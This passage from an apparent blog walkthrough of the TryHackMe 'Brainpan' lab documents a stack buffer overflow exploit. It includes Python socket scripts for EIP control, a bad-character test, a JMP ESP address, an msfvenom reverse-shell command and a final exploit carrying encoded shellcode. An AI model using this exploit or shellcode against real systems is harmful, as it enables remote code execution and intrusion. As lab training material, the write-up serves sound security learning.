+</span></span><span class="line"><span class="cl"><span class="n">total_length</span> <span class="o">=</span> <span class="mi">2072</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">524</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div><p>We try controlling the EIP with 4Bs and get the ascii value for B as 42424242 on the EIP register.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/13.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We have control over the EIP.</p>
+<h4 id="step-4-finding-the-bad-characters" class="relative group">Step 4: Finding the bad characters <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-finding-the-bad-characters" aria-label="Anchor">#</a></span></h4>
+<p>We need to determine the characters that brainpan does not like. This will help us create our payload without the bad characters.</p>
+<p>I like to use the struct inbuilt module with list comprehension. Modify your script as follows and send the bad characters.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bad_chars</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;B&#34;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.100.85&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">total_length</span> <span class="o">=</span> <span class="mi">2072</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">524</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bad_chars</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_length</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">bad_chars</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div><p>We can observe the characters in the hex dump and see if we get any bad ones. Luckily for us there are no bad characters here.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/14.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h4 id="step-5-finding-a-jmp-esp-instruction" class="relative group">Step 5: Finding a JMP ESP instruction <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-finding-a-jmp-esp-instruction" aria-label="Anchor">#</a></span></h4>
+<p>We need to find a JMP ESP instruction that will take us to the top of the stack. We will use this JMP ESP as the new EIP so that we hijack the control flow of the program.</p>
+<p>We can use the mona module
+<code>!mona jmp -r esp </code></p>
+<p>We get an address that points to a jmp esp instruction <code>0x311712F3</code></p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/15.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Set a breakpoint at that instruction. Ctrl+G , enter the address value then press enter and set breakpoint.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/16.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Modify our script as follows and observe that we hit the breakpoint,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bad_chars</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;B&#34;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.100.85&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">total_length</span> <span class="o">=</span> <span class="mi">2072</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">524</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_eip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="mh">0x311712F3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_eip</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_length</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div><p>step through the code using f7 and observe how we get redirected to the top of the stack</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/17.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h4 id="step-6-generating-shellcode" class="relative group">Step 6: Generating shellcode <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-6-generating-shellcode" aria-label="Anchor">#</a></span></h4>
+<p>Now we can generate shellcode to get a reverse shell on our program</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>wlan0 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -e x86/shikata_ga_nai -f py -b <span class="s2">&#34;\x00&#34;</span>
+</span></span></code></pre></div><p>Modify our script and send the payload while listening on port 4444</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/18.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Sweet :) Our exploit worked. Now recreate the shellcode but with tun0 for tryhackme local IP. Change the IP in the script to the remote IP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># bad_chars = b&#34;&#34;.join([pack(&#34;&lt;B&#34;,x) for x in range(1,256)])</span>
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;10.10.255.160&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xdb\xd4\xba\x70\xb3\xd8\x55\xd9\x74\x24\xf4\x5b\x29</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\x23\xa0\x3a</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa0\x3f\x2e\x38\x4b\xbf\xaf\x5d\xc5\x5a\x9e\x5d\xb1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2f\xb1\x6d\xb1\x7d\x3e\x05\x97\x95\xb5\x6b\x30\x9a</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7e\xc1\x66\x95\x7f\x7a\x5a\xb4\x03\x81\x8f\x16\x3d</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x4a\xc2\x57\x7a\xb7\x2f\x05\xd3\xb3\x82\xb9\x50\x89</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x1e\x32\x2a\x1f\x27\xa7\xfb\x1e\x06\x76\x77\x79\x88</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x79\x54\xf1\x81\x61\xb9\x3c\x5b\x1a\x09\xca\x5a\xca</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x43\x33\xf0\x33\x6c\xc6\x08\x74\x4b\x39\x7f\x8c\xaf</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc4\x78\x4b\xcd\x12\x0c\x4f\x75\xd0\xb6\xab\x87\x35</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x20\x38\x8b\xf2\x26\x66\x88\x05\xea\x1d\xb4\x8e\x0d</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x3c\xd4\x29\xd5\x65\x8e\x50\x4c\xc0\x61\x6c\x8e</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\xde\xc8\xc5\x46\x0a\x61\x84\x0e\xff\x48\x36\xcf</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x97\xdb\x45\xfd\x38\x70\xc1\x4d\xb0\x5e\x16\xb1\xeb</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x27\x88\x4c\x14\x58\x81\x8a\x40\x08\xb9\x3b\xe9\xc3</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x39\xc3\x3c\x43\x69\x6b\xef\x24\xd9\xcb\x5f\xcd\x33</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc4\x80\xed\x3c\x0e\xa9\x84\xc7\xd9\xdc\x5a\xee\xb8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\x58\xf0\xab\x15\xd4\x16\xa1\xb5\xb0\x81\x5e\x2f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x99\x59\xfe\xb0\x37\x24\xc0\x3b\xb4\xd9\x8f\xcb\xb1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\x78\x3c\x8c\xb3\x2f\x43\x3a\xdb\xac\xd6\xa1\x1b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xca\x7d\x4c\xeb\x3d\x74\x18\x01\x67\x2e\x3e\xd8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x09\xfa\x07\xc2\x94\x03\xc5\x7e\xb3\x13\x13\x7e</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff\x47\xcb\x29\xa9\x31\xad\x83\x1b\xeb\x67\x7f\xf2</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7b\xf1\xb3\xc5\xfd\xfe\x99\xb3\xe1\x4f\x74\x82\x1e</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f\x10\x02\x67\x9d\x80\xed\xb2\x25\xb0\xa7\x9e\x0c</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x59\x6e\x4b\x0d\x04\x91\xa6\x52\x31\x12\x42\x2b\xc6</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0a\x27\x2e\x82\x8c\xd4\x42\x9b\x78\xda\xf1\x9c\xa8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">total_length</span> <span class="o">=</span> <span class="mi">2072</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">524</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop_sled</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">16</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_eip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="mh">0x311712F3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_eip</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nop_sled</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_length</span><span class="o">-</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">nop_sled</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div><p>We get a shell :)</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/19.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Happy hacking :)</p>
+
+      </div>
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group" href="/posts/2021-04-01_binextryhackme/">
+              <span
+                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Binex-Tryhackme</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-04-01 18:50:44.566 &#43;0000 UTC">1 April 2021</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group" href="/posts/2021-04-17_yaml2json-hackpack-ctf/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Yaml-2-Json Hackpack CTF</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-04-17 18:46:32.088 &#43;0000 UTC">17 April 2021</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    </footer>
+    
+  </article>
+
+        
+          <div
+            class="absolute top-[110vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
+          >
+            <a
+              href="#the-top"
+              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main>
+      <div
+  id="search-wrapper"
+  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
+  data-url="https://trevorsaudi.com/"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+<footer class="py-10 print:hidden">
+  
+  
+  <div class="flex justify-between">
+    <div>
+      
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          😄
+      </p>
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://git.io/hugo-congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    
+    
+      <div
+        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
+      >
+        <button
+          id="appearance-switcher"
+          class="w-12 h-12 "
+          type="button"
+          title="Switch to dark appearance"
+        >
+          <span class="inline dark:hidden">
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+</span>
+          <span class="hidden dark:inline">
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+</span>
+        </button>
+      </div>
+    
+  </div>
+  
+  
+</footer>
